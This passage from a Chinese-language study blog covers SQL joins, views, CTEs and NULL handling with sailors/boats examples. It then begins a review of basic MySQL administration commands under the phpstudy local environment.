class="keyword">AND</span> R.sid <span class="operator">=</span> S.sid))</span><br></pre></td></tr></table></figure>
<h3 id="ARGMAX？这块没太懂"><a class="header-anchor" href="#ARGMAX？这块没太懂">¶</a>ARGMAX？这块没太懂</h3>
<h4 id="Pt-1"><a class="header-anchor" href="#Pt-1">¶</a>Pt 1</h4>
<ul>
<li>The sailor with the highest rating</li>
<li>Correct or Incorrect?</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MAX</span>(S.rating)</span><br><span class="line"><span class="keyword">FROM</span> Sailors S;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> S.<span class="operator">*</span>, <span class="built_in">MAX</span>(S.rating)</span><br><span class="line"><span class="keyword">FROM</span> Sailors S;</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个写法不对，因为只输出的最大值，而没有输出最大值对应的水手的姓名等信息</li>
<li>第二个写法有S.* ，包含了S的所有列，包括姓名、ID、最大值等。但是第二个写法是非法的，该查询会被拒绝。因为不知道该输出哪个水手的信息</li>
<li>MAX是一个聚合函数，必须与GROUP NY子句一起使用，或者在子查询中使用，而不能直接与单个记录的列一起选择（？</li>
</ul>
<h4 id="Pt-2"><a class="header-anchor" href="#Pt-2">¶</a>Pt 2</h4>
<p>以下两个query的结果一致，都是输出rating最大值的水手的信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.rating <span class="operator">&gt;=</span> <span class="keyword">ALL</span></span><br><span class="line">	(<span class="keyword">SELECT</span> S2.rating</span><br><span class="line">    <span class="keyword">FROM</span> Sailors S2)</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> rating <span class="keyword">DESC</span></span><br><span class="line">LIMIT <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>第一种写法可能会返回一大堆评级为最高级的水手信息，相比之下第二种写法只会返回一种水手信息</p>
<h3 id="“Inner”-Joins-Another-Syntax"><a class="header-anchor" href="#“Inner”-Joins-Another-Syntax">¶</a>“Inner” Joins: Another Syntax</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.<span class="operator">*</span>, r.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors s, Reserves r</span><br><span class="line"><span class="keyword">WHERE</span> s.sid <span class="operator">=</span> r.sid</span><br><span class="line"><span class="keyword">AND</span> ...</span><br></pre></td></tr></table></figure>
<p>以上是第一种写法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.<span class="operator">*</span>, r.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors s <span class="keyword">INNER</span> <span class="keyword">JOIN</span> Reserves r</span><br><span class="line"><span class="keyword">ON</span> s.sid <span class="operator">=</span> r.sid</span><br><span class="line"><span class="keyword">WHERE</span> ...</span><br></pre></td></tr></table></figure>
<p>以上是第二种写法，两种写法的效果一样</p>
<p><code>Inner Join</code>是一种中缀表示法，位于两个表的名称之间，用于两个表联接</p>
<h3 id="Join-Variants"><a class="header-anchor" href="#Join-Variants">¶</a>Join Variants</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">&lt;</span><span class="keyword">column</span> expression list<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"> [<span class="keyword">INNER</span> <span class="operator">|</span> <span class="keyword">NATURAL</span></span><br><span class="line"> 	<span class="operator">|</span> &#123;<span class="keyword">LEFT</span> <span class="operator">|</span> <span class="keyword">RIGHT</span> <span class="operator">|</span> <span class="keyword">FULL</span> &#125; &#123;<span class="keyword">OUTER</span>&#125;] <span class="keyword">JOIN</span></span><br><span class="line"> 	table_name</span><br><span class="line"> 	<span class="keyword">ON</span> <span class="operator">&lt;</span>qualification list<span class="operator">&gt;</span></span><br><span class="line"> <span class="keyword">WHERE</span> ...</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>INNER is default    默认为内部连接</p>
</li>
<li>
<p>Inner join what we 've learned so far  -Same thing, just with different syntax</p>
</li>
</ul>
<h4 id="Inner-Natural-Joins"><a class="header-anchor" href="#Inner-Natural-Joins">¶</a>Inner/Natural Joins</h4>
<ul>
<li>
<p>内部连接/自然连接</p>
</li>
<li>
<p>以下三种写法等效</p>
</li>
<li>
<p>第一种：最开始的两表联合查询</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.sid, s.sname, r.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors s, Reserves r</span><br><span class="line"><span class="keyword">WHERE</span> s.sid <span class="operator">=</span> r.sid</span><br><span class="line"> <span class="keyword">AND</span> s.age <span class="operator">&gt;</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第二种：Inner Join</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.sid, s.sname, r.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors s <span class="keyword">INNER</span> <span class="keyword">JOIN</span> Reserves r</span><br><span class="line"><span class="keyword">ON</span> s.sid <span class="operator">=</span> r.sid</span><br><span class="line"> <span class="keyword">WHERE</span> s.age <span class="operator">&gt;</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第三种：Natural Join</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.sid, s.sname, r.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors s <span class="keyword">NATURAL</span> <span class="keyword">JOIN</span> Reserves r</span><br><span class="line"><span class="keyword">WHERE</span> s.age <span class="operator">&gt;</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>&quot;NATURAL&quot;</code> means equi-join for pairs of attributes with the same name</li>
<li><code>Natural Join</code> 是``Inner Join<code>的一种特殊情况，</code>Natural Join<code>的</code>on<code>子句在后台被自动计算，自动匹配相等的列名称，也就是第二种写法中的</code>s.sid = r.sid`</li>
<li>所以<em>谨慎选择使用<code>natural join</code></em>，因为这种方法会选择联合的表中<strong>所有列名称相同</strong>的匹配字段；而且随着向表中添加或删除列或重命名列，``natural join`会以不可预测的方式中断，所以一般不推荐使用</li>
</ul>
<h4 id="Left-Outer-Join"><a class="header-anchor" href="#Left-Outer-Join">¶</a>Left Outer Join</h4>
<ul>
<li>returns all matched rows, and preserves all unmatched rows from the table on the left of the join clause    -(use nulls in fields of non-matching tuples)   返回所有匹配的行，并保留连接子句左侧表中未匹配的所有行  （在不匹配元组的字段中使用空值）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.sid, s.sname, r.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors2 s <span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> Reserves2 r</span><br><span class="line"><span class="keyword">On</span> s.sid <span class="operator">=</span> r.sid;</span><br></pre></td></tr></table></figure>
<ul>
<li>returns all sailors &amp; bid for boat in any of their reservations   返回了所有水手及其在<code>Reserves</code>中的船只编号<code>r.bid</code></li>
<li>note: no match for s.sid? r.bid IS NULL  如果<code>s.sid</code>没有匹配项则<code>r.bid = NULL</code>     结果集将包含左侧表的所有记录，以及右侧表中对应的记录</li>
</ul>
<h4 id="Right-Outer-Join"><a class="header-anchor" href="#Right-Outer-Join">¶</a>Right Outer Join</h4>
<ul>
<li>returns all matched rows, and preserves all unmatched rows from the table on the rightof the join clause    -(use nulls in fields of non-matching tuples)   返回所有匹配的行，并保留连接子句右侧表中未匹配的所有行  （在不匹配元组的字段中使用空值）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> r.sid, b.bid, b.bname</span><br><span class="line"><span class="keyword">FROM</span> Reserves2 r <span class="keyword">RIGHT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> Boats2 b</span><br><span class="line"><span class="keyword">On</span> r.bid <span class="operator">=</span> b.bid</span><br></pre></td></tr></table></figure>
<ul>
<li>returns all boats&amp; sid for any sailor associated with the reservation   返回了所有水手及其在<code>Reserves</code>中的船只编号<code>r.bid</code></li>
<li>note: no match for s.sid? r.bid IS NULL  如果<code>s.sid</code>没有匹配项则<code>r.bid = NULL</code>     结果集将包含右侧表的所有记录，以及左侧表中对应的记录</li>
</ul>
<h4 id="Full-Outer-Join"><a class="header-anchor" href="#Full-Outer-Join">¶</a>Full Outer Join</h4>
<ul>
<li>Returns all (matched or unmatched) rows from the tables on both sides of the join clause    返回连接子句两侧表中的所有行（不管匹不匹配）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> r.sid, b.bid, b.bname</span><br><span class="line"><span class="keyword">FROM</span> Reserves2 r <span class="keyword">FULL</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> Boats2 b</span><br><span class="line"><span class="keyword">ON</span> r.bid <span class="operator">=</span> b.bid</span><br></pre></td></tr></table></figure>
<ul>
<li>returns all boats &amp; all information on reservations   返回左右表所有信息    此处即所有船只和所有预订信息</li>
<li>No match for r.bid?  - b.bid IS NULL AND b.bname IS NULL   如果<code>r.bid没有匹配项？</code> 则 <code>b.bid</code> 和 <code>b.bname</code> 都是<code>NULL</code></li>
<li>No match for b.bid?  - <code>r.sid</code> IS NULL</li>
</ul>
<h3 id="Views-Named-Queries"><a class="header-anchor" href="#Views-Named-Queries">¶</a>Views: Named Queries</h3>
<ul>
<li>视图是一个虚拟的表，其内容由SQL查询定义。视图不存储数据，而是在查询视图时动态生成数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> view_name   <span class="operator">/</span><span class="operator">/</span> 创建视图</span><br><span class="line"><span class="keyword">AS</span> select_statement     <span class="operator">/</span><span class="operator">/</span> 定义视图内容</span><br></pre></td></tr></table></figure>
<ul>
<li>Makes development simpler   简化复杂的查询，通过简单的视图名称来代替复杂的SQL语句</li>
<li>Often used for security  视图可以限制用户对某些数据的访问，隐藏其余数据</li>
<li>Not “materialized”   非物化，即视图不存储查询结果，每次访问视图时都会执行底层的SQL查询</li>
<li>应用场景：数据聚合、数据过滤、简化复杂查询等</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> Redcount</span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">SELECT</span> B.bid, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> scount</span><br><span class="line">	<span class="keyword">FROM</span> Boats2 B, Reserves2 R</span><br><span class="line">	<span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> B.bid</span><br></pre></td></tr></table></figure>
<ul>
<li><code>Redcount</code>视图通过查询<code>Boats2</code>和<code>Reserves2</code>表，统计了颜色为红色的船只的预订数量，并按船只编号分组。如果<code>B.bid</code>在<code>Reserves2</code>表中没有匹配项，那么对应的计数将为0</li>
</ul>
<h4 id="Views-Instead-of-Relations-in-Queries-这个没太懂"><a class="header-anchor" href="#Views-Instead-of-Relations-in-Queries-这个没太懂">¶</a>Views Instead of Relations in Queries   这个没太懂</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> Redcount</span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">SELECT</span> B.bid, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> scount</span><br><span class="line">	<span class="keyword">FROM</span> Boats2 B, Reserves2 R</span><br><span class="line">	<span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> B.bid;</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 因为视图是一个虚拟的表，所以这条语句执行的是定义视图时的<span class="keyword">SQL</span>查询</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> Redcount</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> bname, scount</span><br><span class="line"><span class="keyword">FROM</span> Redcount R, Boats2 B  <span class="operator">/</span><span class="operator">/</span> 将视图和Boats2表进行查询</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid</span><br><span class="line"><span class="keyword">AND</span> scount <span class="operator">&lt;</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<ul>
<li>基于<code>Boats2</code>和<code>Reserves2</code>表，统计了颜色为红色的船只的预订数量，并按船只编号分组</li>
</ul>
<h4 id="Subqueries-in-FROM"><a class="header-anchor" href="#Subqueries-in-FROM">¶</a>Subqueries in FROM</h4>
<ul>
<li>想创建一个只使用一次的“视图”    “即时视图”</li>
<li>define some query in the FROM while define the outer query   定义外部查询时在FROM语句中定义子查询</li>
<li>Like a “view on the fly”</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> bname, scount</span><br><span class="line"><span class="keyword">FROM</span> Boats2 B,</span><br><span class="line">(<span class="keyword">SELECT</span> B.bid, <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line">	<span class="keyword">FROM</span> Boats2 B, Reserves2 R</span><br><span class="line">	<span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> B.bid) <span class="keyword">AS</span> Reds(bid, scount)</span><br><span class="line">  <span class="keyword">WHERE</span> Reds.bid <span class="operator">=</span> B.bid   <span class="operator">/</span><span class="operator">/</span> 连接子查询</span><br><span class="line">  	<span class="keyword">AND</span> scount <span class="operator">&lt;</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h4 id="With-a-k-a-common-table-expression-CTE"><a class="header-anchor" href="#With-a-k-a-common-table-expression-CTE">¶</a>With a.k.a common table expression(CTE)</h4>
<ul>
<li>CTE   Common Table Expression  公用表表达式</li>
<li>Another “view on the fly” syntax:</li>
<li>在常规查询之前定义子查询，这个子查询可在后面的查询复用</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> 定义了Reds这个子查询</span><br><span class="line">	<span class="keyword">WITH</span> Reds(bid, scount) <span class="keyword">AS</span></span><br><span class="line">	(<span class="keyword">SELECT</span> B.bid, <span class="built_in">COUNT</span> (<span class="operator">*</span>)</span><br><span class="line">    <span class="keyword">FROM</span> Boats2 B, Reserves2 R</span><br><span class="line">    <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span> B.bid)    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">SELECT</span> bname, scount</span><br><span class="line"><span class="keyword">FROM</span> Boats2 B, Reds</span><br><span class="line"><span class="keyword">WHERE</span> Reds.bid <span class="operator">=</span> B.bid</span><br><span class="line"><span class="keyword">AND</span> scount <span class="operator">&lt;</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h4 id="Can-have-many-queries-in-WITH"><a class="header-anchor" href="#Can-have-many-queries-in-WITH">¶</a>Can have many queries in WITH</h4>
<ul>
<li>Another “view on the fly” syntax</li>
<li>在常规查询前定义多个子查询，这些子查询也可以相互引用</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">WITH</span> Reds(bid, scount) <span class="keyword">AS</span></span><br><span class="line">	(<span class="keyword">SELECT</span> B.bid, <span class="built_in">COUNT</span> (<span class="operator">*</span>)</span><br><span class="line">    <span class="keyword">FROM</span> Boats2 B, Reserves2 R</span><br><span class="line">    <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span> B.bid),</span><br><span class="line">    </span><br><span class="line">    UnpopularReds <span class="keyword">AS</span></span><br><span class="line">    <span class="keyword">SELECT</span> bname, scount</span><br><span class="line">    <span class="keyword">FROM</span> Boats2 B, Reds</span><br><span class="line">    <span class="keyword">WHERE</span> Reds.bid <span class="operator">=</span> B.bid</span><br><span class="line">    <span class="keyword">AND</span> scount <span class="operator">&lt;</span> <span class="number">10</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> UnpopularReds;</span><br></pre></td></tr></table></figure>
<h4 id="Example-ARGMAX-GROUP-BY"><a class="header-anchor" href="#Example-ARGMAX-GROUP-BY">¶</a>Example: ARGMAX GROUP BY?</h4>
<ul>
<li>The sailor with the highest rating per age  找出每个年龄段最高的rating值</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">WITH</span> maxratings(age, maxrating) <span class="keyword">AS</span></span><br><span class="line">	(<span class="keyword">SELECT</span> age, <span class="built_in">max</span>(rating)</span><br><span class="line">	<span class="keyword">FROM</span> Sailors</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> age)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">SELECT</span> S.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S, maxratings m</span><br><span class="line"><span class="keyword">WHERE</span> S.age <span class="operator">=</span> m.age</span><br><span class="line"><span class="keyword">AND</span> S.rating <span class="operator">=</span> m.maxrating</span><br></pre></td></tr></table></figure>
<h3 id="Testing-SQL-Queries"><a class="header-anchor" href="#Testing-SQL-Queries">¶</a>Testing SQL Queries</h3>
<ul>
<li>Not every database instance will reveal every bug in your query
<ul>
<li>Eg: database instance without any rows in it</li>
</ul>
</li>
<li>Need to debug your queries</li>
<li>reasoning about them carefully</li>
<li>constructing test data</li>
</ul>
<h3 id="Brief-Detour-Null-Values"><a class="header-anchor" href="#Brief-Detour-Null-Values">¶</a>Brief Detour: Null Values</h3>
<ul>
<li>Field values are sometimes unknown
<ul>
<li>SQL provides a special value NULL for such situations</li>
<li>every data type can be NULL</li>
</ul>
</li>
<li>The presence of null complicates many issues. E.g.:  有时有NULL会变得复杂
<ul>
<li>Selection predicates(<code>WHERE</code>)   <code>NULL</code>如何与<code>WHERE</code>子句交互</li>
<li>Aggregation    聚合</li>
</ul>
</li>
<li>But NULLs comes naturally from Outer joins  NULL无法避免，NULL来自外部连接</li>
</ul>
<h4 id="NULL-in-the-WHERE-clause"><a class="header-anchor" href="#NULL-in-the-WHERE-clause">¶</a>NULL in the WHERE clause</h4>
<h5 id="Example"><a class="header-anchor" href="#Example">¶</a>Example</h5>
<ul>
<li>
<p>Consider a tuple where rating IS NULL</p>
</li>
<li>
<pre><code class="language-sql">INSERT INTO sailors VALUES
(11, 'Jack Sparrow', NULL, 35);

SELECT * FROM sailors
WHERE rating &gt; 8;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- Is Jack Sparrow in the output?    --The result is yes/no 有/没有，答案不能是含糊的</span><br><span class="line"></span><br><span class="line">#### NULL in comparators</span><br><span class="line"></span><br><span class="line">- 比较器中的NULL</span><br><span class="line">- Rules: (x op NULL) evaluates to ... NULL!</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">SELECT rating = NULL FROM sailors;</span><br><span class="line">SELECT rating &lt; NULL FROM sailors;</span><br><span class="line">SELECT rating &gt;= NULL FROM sailors;</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
<li>
<p>每行SELECT语句返回的都是NULL</p>
</li>
</ul>
<h4 id="Explicit-NULL-Checks"><a class="header-anchor" href="#Explicit-NULL-Checks">¶</a>Explicit NULL Checks</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sailors <span class="keyword">WHERE</span> rating <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sailors <span class="keyword">WHERE</span> rating <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>显式NULL检查</li>
<li>当将字段与NULL进行比较时，使用<code>IS NULL</code>/<code>IS NOT NULL</code> 而不是等号，返回值为<code>true/false</code></li>
</ul>
<h4 id="NULL-at-top-of-WHERE"><a class="header-anchor" href="#NULL-at-top-of-WHERE">¶</a>NULL at top of WHERE</h4>
<ul>
<li>Rule: Do not output a tuple WHERE NULL</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sailors;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sailors <span class="keyword">WHERE</span> rating <span class="operator">&gt;</span> <span class="number">8</span>;  <span class="operator">/</span><span class="operator">/</span> <span class="keyword">NULL</span> <span class="operator">&gt;</span> <span class="number">8</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sailors <span class="keyword">WHERE</span> rating <span class="operator">&lt;=</span> <span class="number">8</span>;  <span class="operator">/</span><span class="operator">/</span> <span class="keyword">NULL</span> <span class="operator">&lt;=</span> <span class="number">8</span></span><br></pre></td></tr></table></figure>
<ul>
<li>二三句查询语句的结果都是NULL，因此结果不会输出</li>
</ul>
<h4 id="NULL-in-boolean-Logic"><a class="header-anchor" href="#NULL-in-boolean-Logic">¶</a>NULL in boolean Logic</h4>
<ul>
<li>布尔逻辑中的NULL</li>
<li>SQL遵循三值逻辑：<code>True</code> / <code>False</code> / <code>NULL</code></li>
</ul>
<table>
<thead>
<tr>
<th>not</th>
<th>t</th>
<th>f</th>
<th>n</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>F</td>
<td>T</td>
<td>N</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>AND</th>
<th>T</th>
<th>F</th>
<th>N</th>
</tr>
</thead>
<tbody>
<tr>
<td>T</td>
<td>T</td>
<td>F</td>
<td>N</td>
</tr>
<tr>
<td>F</td>
<td>F</td>
<td>F</td>
<td>F</td>
</tr>
<tr>
<td>N</td>
<td>N</td>
<td>F</td>
<td>N</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>OR</th>
<th>T</th>
<th>F</th>
<th>N</th>
</tr>
</thead>
<tbody>
<tr>
<td>T</td>
<td>T</td>
<td>T</td>
<td>T</td>
</tr>
<tr>
<td>F</td>
<td>T</td>
<td>F</td>
<td>N</td>
</tr>
<tr>
<td>N</td>
<td>T</td>
<td>N</td>
<td>N</td>
</tr>
</tbody>
</table>
<ul>
<li>General rule:
<ul>
<li>NULL can take on either T or F, so answer needs to accommodate either value   NULL可以代表TRUE或FALSE，因此任何包含NULL的布尔表达式的结果都需要 能够适应这两种可能的值（好奇妙啊</li>
</ul>
</li>
</ul>
<h4 id="NULL-and-Aggregation"><a class="header-anchor" href="#NULL-and-Aggregation">¶</a>NULL and Aggregation</h4>
<ul>
<li>General rule:
<ul>
<li>NULL <strong>column values</strong> are ignored by aggregate functions   聚合函数在处理输出时会忽略列中的NULL值。如果某个列的值是NULL，则其不会对聚合函数的结果产生影响（值都不知道啊不知道干脆忽视吧^^</li>
</ul>
</li>
</ul>
<h4 id="NULLs-Summary"><a class="header-anchor" href="#NULLs-Summary">¶</a>NULLs: Summary</h4>
<ul>
<li>(x op NULL) is NULL</li>
<li>WHERE NULL: do not send to output</li>
<li>Boolean connectives: 3-valued logic</li>
<li>Aggregates ignore NULL-valued inputs</li>
</ul>
<h2 id="Summary"><a class="header-anchor" href="#Summary">¶</a>Summary</h2>
<ul>
<li>SQL is a declarative language    声明式语言
<ul>
<li>Somebody has to translate to algorithms though   需要将其翻译成算法</li>
<li>The RDBMS implementor … i.e. you   自分=数据库管理系统的实现者</li>
</ul>
</li>
<li>The data structure and algorithms that make SQL possible also power:  SQL背后的数据结构和算法也支持：
<ul>
<li>NoSQL, data mining, scalable ML, network routing   NoSQL、数据挖掘、可扩展的机器学习、网络路由</li>
<li>A toolbox for scalable computing   一套用于可扩展计算的工具箱</li>
</ul>
</li>
<li>Temporarily skirted questions of good database(schema) design   后续继续讨论数据库（架构）设计的问题
<ul>
<li>a topic we ‘ll consider in greater depth later’</li>
</ul>
</li>
</ul>
<h2 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h2>
<p>课的知识密度很高，算算时长两节课才两个多小时可能，我tm看了两三天。。。需要停一停沉淀一下了</p>
<p>哔哔：</p>
<p>感觉没什么东西能真正留住我，是我想留下，所以才给自己硬栓了一条绳子。但是刚刚，产生了五分钟拴不住的念头</p>
<p>可能是学累了吧嘿嘿</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>【在xp.cn上】MySQL+PHP复习</title>
    <url>/project/2024/07/11/CS_Notes/Database/PHP+MySQL_note_and_practice/</url>
    <content><![CDATA[<h2 id="xp-cn下的MySQL"><a class="header-anchor" href="#xp-cn下的MySQL">¶</a>xp.cn下的MySQL</h2>
<p>本地的MySQL之前被卸载了，为了不跟小皮的冲突</p>
<p>访问xp.cn的MySQL路径：<code>phpstudy_pro\Extensions\MySQL5.7.26\bin</code></p>
<p>在当前路径下访问cmd</p>
<p><code>mysql -uroot -p</code>     密码可见小皮界面的数据库模块</p>
<p><code>show databases;</code> 查看所有库</p>
<p><code>use database_name;</code> 使用某个库</p>
<p><code>show tables;</code>  显示当前库中所有的表</p>
<p><code>select * from table_name;</code>  显示当前库中某表的所有内容</p>
<h2 id="创建数据库与表，插入数据"><a class="header-anchor" href="#创建数据库与表，插入数据">¶</a>创建数据库与表，插入数据</h2>
<h4 id="数据库的整体结构："><a class="header-anchor" href="#数据库的整体结构：">¶</a><strong>数据库的整体结构：</strong></h4>
<ul>
<li>电脑（服务器）-&gt;数据库软件（mysql、mssql、甲骨文、mariadb…）-&gt;数据库-&gt; 表-&gt;字段</li>
</ul>
<h4 id="数据库进入方法："><a class="header-anchor" href="#数据库进入方法：">¶</a><strong>数据库进入方法：</strong></h4>
<p>​	1、直接进入</p>
<p>​	2、使用软件连接</p>
<p>​	3、使用phpmyadmin //注意，PHP版本要高于7.0才可以直接使用</p>
<p>​	进入sql代码，在mysql的bin路径输入</p>
<p>​	<code>.\mysql.exe -h 127.0.0.1 -u root -p</code></p>
<h4 id="数据库操纵语句"><a class="header-anchor" href="#数据库操纵语句">¶</a><strong>数据库操纵语句</strong></h4>
<ul>
<li>
<p>查询MySQL内的数据库</p>
<ul>
<li>show databases;`</li>
</ul>
</li>
<li>
<p>创建库</p>
<ul>
<li>create database kkk;`</li>
</ul>
</li>
<li>
<p>删除库</p>
<ul>
<li>drop database kkk;`</li>
</ul>
</li>
<li>
<p>创建表，之前需要先构思好表单的结构，然后创建每个表的属性</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>id</th>
<th>user</th>
<th>pass</th>
<th>phone</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>admin</td>
<td>123456</td>
<td>13800000000</td>
</tr>
<tr>
<td>自增数字</td>
<td>字符串</td>
<td>字符串</td>
<td>数字</td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use kkk; //进入库</span><br><span class="line">//创建kkk_tbl表</span><br><span class="line">CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span><br><span class="line">`id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">`user` VARCHAR(10) NOT NULL,</span><br><span class="line">`pass` VARCHAR(10) NOT NULL,</span><br><span class="line">`phone` INT(11) NOT NULL,</span><br><span class="line">PRIMARY KEY ( `id` )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>NOT NULL - 每一行都必须含有值（不能为空），null 值是不允许的。</p>
</li>
<li>
<p>DEFAULT value - 设置默认值</p>
</li>
<li>
<p>UNSIGNED - 使用无符号数值类型，0 及正数</p>
</li>
<li>
<p>AUTO INCREMENT - 设置 MySQL 字段的值在新增记录时每次自动增长 1</p>
</li>
<li>
<p>PRIMARY KEY - 设置数据表中每条记录的唯一标识。 通常列的PRIMARY KEY 设置为 ID 数值，与 AUTO_INCREMENT 一起使用。</p>
</li>
</ul>
<h4 id="查看表的框架"><a class="header-anchor" href="#查看表的框架">¶</a>查看表的框架</h4>
<p><code>desc kkk_tbl;</code></p>
